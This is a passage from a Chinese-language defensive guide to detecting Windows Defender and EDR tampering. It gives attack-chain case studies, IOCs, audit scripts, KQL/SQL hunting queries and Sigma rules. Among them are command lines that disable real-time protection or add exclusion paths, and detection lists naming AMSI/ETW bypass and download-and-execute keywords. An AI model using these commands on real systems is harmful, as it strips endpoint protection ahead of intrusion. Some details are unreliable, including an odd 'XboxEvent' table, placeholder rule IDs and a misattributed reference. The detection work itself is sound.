2. **AMSI 绕过**：使用 `amsiInitFailed` 字段设置或 `AmsiScanBuffer` 补丁绕过 PowerShell 扫描
3. **Defender 策略篡改**：通过 `Set-MpPreference` 添加排除路径，将工具和载荷放置在排除目录中
4. **ETW 篡改**：补丁 `EtwEventWrite` 或关闭 ETW Session 以阻断行为日志

**取证特征**：

- Defender Operational 日志中 Event ID 5007 显示排除路径新增记录
- PowerShell Script Block Logging（Event ID 4104）中发现 `Set-MpPreference` 命令
- AMSI 相关日志中发现 `amsiInitFailed` 设置事件
- 排除目录中发现后续攻击工具的哈希值

**关键 IOC**：

- 新增的排除路径：`C:\Windows\Temp`、`C:\PerfLogs`
- PowerShell 命令行：`Set-MpPreference -ExclusionPath`
- AMSI 绕过相关：`AmsiUtils`、`amsiInitFailed`、`VirtualProtect`

### 案例二：Cobalt Strike — EDR Hook 绕过 + 直接系统调用

**攻击背景**：

Cobalt Strike 是渗透测试和红队活动中最常用的 C2 框架，在真实攻击中也被广泛滥用。现代 Cobalt Strike Beacon 集成了多种 EDR 绕过技术。

**攻击手法分析**：

1. **进程注入**：Beacon 注入到合法进程中（如 `dllhost.exe`、`msbuild.exe`）
2. **ETW Hook**：补丁 `EtwEventWrite` 使 ETW 事件不再产生
3. **Direct Syscall**：使用 Hell's Gate 或 Halo's Gate 动态解析系统调用号，绕过用户态 Hook
4. **AMSI 绕过**：在 payload 加载前先执行 AMSI 补丁
5. **手工映射**：Beacon DLL 通过手工映射方式加载，不在模块列表中出现

**取证特征**：

- ntdll.dll 导出函数前字节被修改（Inline Hook 的特征）
- ETW Provider 事件频率异常下降
- 进程内存中发现可执行的 PE 映像（通过 `VirtualAlloc` + `PAGE_EXECUTE_READWRITE` 分配）
- Sysmon Event ID 7 中发现从异常路径加载的 DLL
- Event ID 10（Process Access）中发现对 lsass.exe 的异常访问

**ETW 绕过的具体特征**：

```xml
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
    <EventID>7</EventID>
    <Version>5</Version>
    <Level>4</Level>
    <Task>7</Task>
    <Opcode>0</Opcode>
    <Keywords>0x8000000000000000</Keywords>
    <TimeCreated SystemTime="2026-06-26T08:15:00.0000000Z" />
    <EventRecordID>78901</EventRecordID>
    <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
    <Computer>WORKSTATION01</Computer>
    <Security UserID="S-1-5-18" />
  </System>
  <EventData>
    <Data Name="ImageLoaded">C:\Windows\System32\amsi.dll</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="Hashes">SHA256=异常的amsi.dll哈希值</Data>
    <Data Name="Signed">true</Data>
    <Data Name="SignatureStatus">Error</Data>
  </EventData>
</Event>
```

### 案例三：勒索软件攻击链 — Defender 禁用 + 受信任进程注入

**攻击背景**：

勒索软件攻击链通常包含 Defender 禁用环节，作为加密载荷执行前的准备工作。多个勒索软件家族（如 LockBit、BlackCat、Royal）在攻击链中使用 Defender 禁用技术。

**典型攻击链**：

1. **初始入侵**：利用 VPN 漏洞或钓鱼邮件获取初始访问
2. **权限提升**：通过漏洞利用或凭据窃取获取管理员权限
3. **Defender 禁用**：
   - 使用 `Set-MpPreference -DisableRealtimeMonitoring $true`
   - 添加排除路径覆盖工具和载荷目录
   - 禁用行为监控和云保护
4. **横向移动**：使用窃取的凭据通过 RDP/WinRM 横向移动
5. **数据窃取**：将敏感数据压缩并上传到外部存储
6. **加密执行**：在目标机器上部署勒索软件载荷

**取证特征分析**：

- Defender 日志中发现保护配置连续变更事件（5007 → 5001 → 3001）
- 排除目录新增事件与加密载荷路径重叠
- 保护禁用到加密开始的时间窗口通常为 30 分钟到数小时
- Event ID 4672（特殊权限分配）在保护禁用前有新的高权限登录事件
- 事件日志可能在加密过程中被清除

**日志时间线重建**：

```powershell
$timeline = @()
$timeline += Get-WinEvent -FilterHashtable @{
    LogName = 'Microsoft-Windows-Windows Defender/Operational'
    Id = 5007, 5001, 3001, 1116
} -MaxEvents 200 -ErrorAction SilentlyContinue | Sort-Object TimeCreated
$timeline += Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4624, 4672, 4688
} -MaxEvents 500 -ErrorAction SilentlyContinue | Sort-Object TimeCreated
$timeline | Sort-Object TimeCreated | Format-Table Time, Source, EventId, Detail -AutoSize
```

---

## 0x12 Defender/EDR 绕过检测自动化与狩猎

### PowerShell 完整性检测脚本

**端点安全产品完整性检测**：

```powershell
function Test-EndpointSecurityIntegrity {
    $results = @()
    
    $defenderService = Get-Service -Name WinDefend -ErrorAction SilentlyContinue
    $results += [PSCustomObject]@{
        Check = 'Defender服务状态'
        Status = if ($defenderService.Status -eq 'Running') { '正常' } else { '异常' }
        Detail = $defenderService.Status
    }
    
    $mpPref = Get-MpPreference -ErrorAction SilentlyContinue
    $results += [PSCustomObject]@{
        Check = '实时保护'
        Status = if ($mpPref.DisableRealtimeMonitoring -eq $false) { '正常' } else { '异常' }
        Detail = "DisableRealtimeMonitoring=$($mpPref.DisableRealtimeMonitoring)"
    }
    $results += [PSCustomObject]@{
        Check = '行为监控'
        Status = if ($mpPref.DisableBehaviorMonitoring -eq $false) { '正常' } else { '异常' }
        Detail = "DisableBehaviorMonitoring=$($mpPref.DisableBehaviorMonitoring)"
    }
    $results += [PSCustomObject]@{
        Check = '云保护'
        Status = if ($mpPref.MAPSReporting -ne 0) { '正常' } else { '异常' }
        Detail = "MAPSReporting=$($mpPref.MAPSReporting)"
    }
    $results += [PSCustomObject]@{
        Check = '脚本扫描'
        Status = if ($mpPref.DisableScriptScanning -eq $false) { '正常' } else { '异常' }
        Detail = "DisableScriptScanning=$($mpPref.DisableScriptScanning)"
    }
    $results += [PSCustomObject]@{
        Check = '网络保护'
        Status = if ($mpPref.EnableNetworkProtection -eq 1) { '正常' } else { '异常' }
        Detail = "EnableNetworkProtection=$($mpPref.EnableNetworkProtection)"
    }
    
    $exclusions = $mpPref.ExclusionPath
    $results += [PSCustomObject]@{
        Check = '排除路径数量'
        Status = if ($exclusions.Count -lt 5) { '正常' } else { '需审查' }
        Detail = "排除路径数: $($exclusions.Count), 路径: $($exclusions -join '; ')"
    }
    
    $tamperProt = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name TamperProtection -ErrorAction SilentlyContinue
    $results += [PSCustomObject]@{
        Check = '防篡改保护'
        Status = if ($tamperProt.TamperProtection -eq 5) { '正常' } else { '异常' }
        Detail = "TamperProtection=$($tamperProt.TamperProtection)"
    }
    
    $policyKeys = @(
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet"
    )
    foreach ($key in $policyKeys) {
        if (Test-Path $key) {
            $props = Get-ItemProperty $key -ErrorAction SilentlyContinue
            foreach ($prop in $props.PSObject.Properties) {
                if ($prop.Name -match "Disable|DisableRealtime|DisableBehavior") {
                    $results += [PSCustomObject]@{
                        Check = "策略键: $($prop.Name)"
                        Status = if ($prop.Value -eq 0 -or $prop.Value -eq $null) { '正常' } else { '异常' }
                        Detail = "值: $($prop.Value)"
                    }
                }
            }
        }
    }
    
    return $results
}

Test-EndpointSecurityIntegrity | Format-Table Check, Status, Detail -AutoSize
```

### Defender 策略审计脚本

**全面的 Defender 配置审计**：

```powershell
function Get-DefenderPolicyAudit {
    $pref = Get-MpPreference
    
    $audit = [PSCustomObject]@{
        扫描时间 = $pref.ScanScheduleQuickScanTime
        快速扫描日 = $pref.ScanScheduleQuickScanDays
        完整扫描时间 = $pref.ScanScheduleDay
        实时保护 = -not $pref.DisableRealtimeMonitoring
        行为监控 = -not $pref.DisableBehaviorMonitoring
        入侵防护 = -not $pref.DisableIntrusionPreventionSystem
        IOAV保护 = -not $pref.DisableIOAVProtection
        脚本扫描 = -not $pref.DisableScriptScanning
        网络保护 = $pref.EnableNetworkProtection
        云保护级别 = $pref.CloudBlockLevel
        云超时 = $pref.CloudExtendedTimeout
        MAPS报告 = $pref.MAPSReporting
        样本提交 = $pref.SubmitSamplesConsent
        排除路径数 = $pref.ExclusionPath.Count
        排除进程数 = $pref.ExclusionProcess.Count
        排除扩展名数 = $pref.ExclusionExtension.Count
        排除IP数 = $pref.ExclusionIpAddress.Count
        引擎版本 = (Get-MpComputerStatus).AntivirusEngineVersion
        签名版本 = (Get-MpComputerStatus).AntivirusSignatureVersion
        签名最后更新 = (Get-MpComputerStatus).AntivirusSignatureLastUpdated
        实时保护状态 = (Get-MpComputerStatus).RealTimeProtectionEnabled
        行为监控状态 = (Get-MpComputerStatus).OnAccessProtectionEnabled
        IoavProtection状态 = (Get-MpComputerStatus).IoavProtectionEnabled
        NISEnabled = (Get-MpComputerStatus).NISEnabled
    }
    
    return $audit
}

Get-DefenderPolicyAudit | Format-List
```

### 事件日志狩猎查询（SQL/KQL）

**KQL 查询：Defender 保护配置变更事件**：

```kql
DeviceEvents
| where Timestamp between (ago(7d) .. now())
| where ActionType in ("AntivirusSettingsChanged", "DefenderSettingsChanged")
| extend SettingName = tostring(parse_json(AdditionalFields).SettingName)
| extend OldValue = tostring(parse_json(AdditionalFields).OldValue)
| extend NewValue = tostring(parse_json(AdditionalFields).NewValue)
| project Timestamp, DeviceName, AccountName, SettingName, OldValue, NewValue
| sort by Timestamp desc
```

**KQL 查询：可疑的 PowerShell 执行链**：

```kql
DeviceProcessEvents
| where Timestamp between (ago(7d) .. now())
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where ProcessCommandLine has_any (
    "-enc", "-EncodedCommand", "IEX", "Invoke-Expression", 
    "DownloadString", "DownloadData", "Net.WebClient",
    "FromBase64String", "Reflection.Assembly", "Load(",
    "Set-MpPreference", "Add-MpPreference", "ExclusionPath"
)
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, 
          InitiatingProcessFileName, InitiatingProcessCommandLine, SHA256
| sort by Timestamp desc
```

**SQL 查询：Windows 事件日志中的 Defender 事件**：

```sql
SELECT 
    TimeGenerated AS EventTime,
    EventID AS EventId,
    Computer,
    RenderedDescription AS Message,
    LevelDisplayName AS Level
FROM XboxEvent
WHERE Channel = 'Microsoft-Windows-Windows Defender/Operational'
    AND EventID IN (1116, 1117, 1118, 5007, 5001, 5004, 3001, 3002, 3004, 3007)
    AND TimeGenerated > DATEADD(day, -7, GETDATE())
ORDER BY TimeGenerated DESC
```

**SQL 查询：Sysmon 与 Defender 事件关联**：

```sql
SELECT 
    d.TimeGenerated AS DefenderTime,
    s.TimeGenerated AS SysmonTime,
    d.Computer,
    d.EventID AS DefenderEventId,
    d.RenderedDescription AS DefenderMessage,
    s.EventID AS SysmonEventId,
    s.RenderedDescription AS SysmonMessage
FROM XboxEvent d
INNER JOIN XboxEvent s 
    ON d.Computer = s.Computer 
    AND ABS(DATEDIFF(second, d.TimeGenerated, s.TimeGenerated)) < 5
WHERE d.Channel = 'Microsoft-Windows-Windows Defender/Operational'
    AND s.Channel = 'Microsoft-Windows-Sysmon/Operational'
    AND d.EventID IN (1116, 1117)
    AND s.EventID IN (1, 3, 7, 10, 11, 13)
    AND d.TimeGenerated > DATEADD(day, -7, GETDATE())
ORDER BY d.TimeGenerated DESC
```

### Sigma 检测规则（≥4 条）

**规则一：检测 Defender 实时保护被禁用**：

```yaml
title: Windows Defender 实时保护被禁用
id: 9f5e049e-9e78-4d92-bd08-28c45f6a607e
status: stable
description: 检测通过 PowerShell 或注册表禁用 Windows Defender 实时保护的行为
references:
  - https://attack.mitre.org/techniques/T1562/001/
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  service: windows-defender
detection:
  selection_eventid:
    EventID:
      - 5001
      - 3001
      - 3002
  selection_message_disable:
    Message|contains:
      - '已禁用'
      - 'Disabled'
      - '关闭'
  condition: selection_eventid and selection_message_disable
falsepositives:
  - 管理员通过组策略集中管理
level: high
```

**规则二：检测 Defender 排除路径被添加**：

```yaml
title: Windows Defender 新增可疑排除路径
id: a1b2c3d4-e5f6-7890-abcd-123456789012
status: stable
description: 检测通过 PowerShell 添加 Defender 排除路径的行为
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  category: process_creation
detection:
  selection_powershell:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_cmdline:
    CommandLine|contains:
      - 'Add-MpPreference'
      - 'ExclusionPath'
      - 'ExclusionProcess'
      - 'ExclusionExtension'
  condition: selection_powershell and selection_cmdline
falsepositives:
  - IT 管理员配置排除策略
level: high
```

**规则三：检测 ETW Session 异常停止**：

```yaml
title: Windows ETW Session 被异常停止
id: b2c3d4e5-f6a7-8901-abcd-234567890123
status: stable
description: 检测 Windows ETW Session 被停止或禁用的行为，可能指示 EDR 绕过尝试
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.006
logsource:
  product: windows
  category: ps_script
detection:
  selection_logman:
    ScriptBlockText|contains:
      - 'logman stop'
      - 'logman update'
      - 'EventLog-Security'
      - 'NT Kernel Logger'
  selection_etw_disable:
    ScriptBlockText|contains:
      - '-ets'
      - 'EtwEventWrite'
      - 'NtTraceEvent'
  condition: selection_logman or selection_etw_disable
falsepositives:
  - 系统管理脚本
level: critical
```

**规则四：检测可疑的 Defender 配置批量变更**：

```yaml
title: Windows Defender 配置批量变更
id: c3d4e5f6-a7b8-9012-abcd-345678901234
status: stable
description: 检测在短时间内多次修改 Defender 配置的行为，可能指示攻击者正在解除防御
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  service: windows-defender
detection:
  selection:
    EventID:
      - 5001
      - 5004
      - 5007
      - 5010
      - 5012
      - 5016
      - 3001
      - 3002
      - 3004
      - 3007
  timeframe: 5m
  condition: selection | count() by Computer >= 3
falsepositives:
  - 系统更新后重新配置
level: high
```

**规则五：检测 Defender 注册表策略键被创建或修改**：

```yaml
title: Windows Defender 注册表策略键被修改
id: d4e5f6a7-b8c9-0123-abcd-456789012345
status: stable
description: 检测通过注册表直接修改 Defender 配置的行为
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.001
logsource:
  product: windows
  category: registry_set
detection:
  selection_path:
    TargetObject|contains:
      - 'Windows Defender\Real-Time Protection'
      - 'Windows Defender\Spynet'
      - 'Windows Defender\Exclusions'
      - 'Windows Defender\DisableAntiSpyware'
  selection_key:
    TargetObject|endswith:
      - '\DisableRealtimeMonitoring'
      - '\DisableBehaviorMonitoring'
      - '\DisableIOAVProtection'
      - '\DisableIntrusionPreventionSystem'
      - '\DisableScriptScanning'
      - '\DisableBlockAtFirstSeen'
  condition: selection_path or selection_key
falsepositives:
  - 组策略部署的配置变更
level: critical
```

**规则六：检测可疑的直接系统调用行为**：

```yaml
title: 可疑的直接系统调用或 ETW Hook 绕过
id: e5f6a7b8-c9d0-1234-abcd-567890123456
status: experimental
description: 检测通过进程内存分析发现的直接系统调用或 ETW Hook 绕过特征
author: Security Analyst
date: 2026/06/26
tags:
  - attack.defense_evasion
  - attack.t1562.006
  - attack.t1620
logsource:
  product: windows
  category: ps_script
detection:
  selection_syscalls:
    ScriptBlockText|contains:
      - 'syscall'
      - 'NtAllocateVirtualMemory'
      - 'NtWriteVirtualMemory'
      - 'NtCreateThreadEx'
  selection_etw:
    ScriptBlockText|contains:
      - 'EtwEventWrite'
      - 'NtTraceEvent'
      - 'EventProvider'
  selection_amsi:
    ScriptBlockText|contains:
      - 'amsiInitFailed'
      - 'AmsiUtils'
      - 'AmsiScanBuffer'
  condition: (selection_syscalls and selection_etw) or selection_amsi
falsepositives:
  - 安全研究工具
level: high
```

---

## 0x13 参考资料

1. Microsoft. "Microsoft Defender Antivirus Documentation" - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/
2. Microsoft. "Windows Defender Event Reference" - https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/events-views
3. MITRE ATT&CK. "T1562 - Impair Defenses" - https://attack.mitre.org/techniques/T1562/
4. MITRE ATT&CK. "T1562.001 - Disable or Modify Tools" - https://attack.mitre.org/techniques/T1562/001/
5. MITRE ATT&CK. "T1562.006 - Indicator Blocking" - https://attack.mitre.org/techniques/T1562/006/
6. MITRE ATT&CK. "T1027 - Obfuscated Files or Information" - https://attack.mitre.org/techniques/T1027/
7. MITRE ATT&CK. "T1055 - Process Injection" - https://attack.mitre.org/techniques/T1055/
8. MITRE ATT&CK. "T1620 - Reflective Code Loading" - https://attack.mitre.org/techniques/T1620/
9. Red Canary. "2025 Threat Detection Report" - https://redcanary.com/threat-detection-report/
10. Mandiant. "M-Trends 2025" - https://www.mandiant.com/resources/m-trends
11. Elastic Security Labs. "Bypassing EDR: A Technical Deep Dive" - https://www.elastic.co/security-labs/
12. CrowdStrike. "Understanding and Evading EDR" - https://www.crowdstrike.com/blog/
13. SentinelOne. "EDR Bypass Techniques and Detection" - https://www.sentinelone.com/labs/
14. Sophos. "Unprotected ETW: How attackers tamper with Windows telemetry" - https://www.sophos.com/en-us/research-content/2024/01/unprotected-etw.html
15. Matt Graebers. "SysWhispers: Direct System Calls" - https://github.com/jthuraisamy/syswhispers
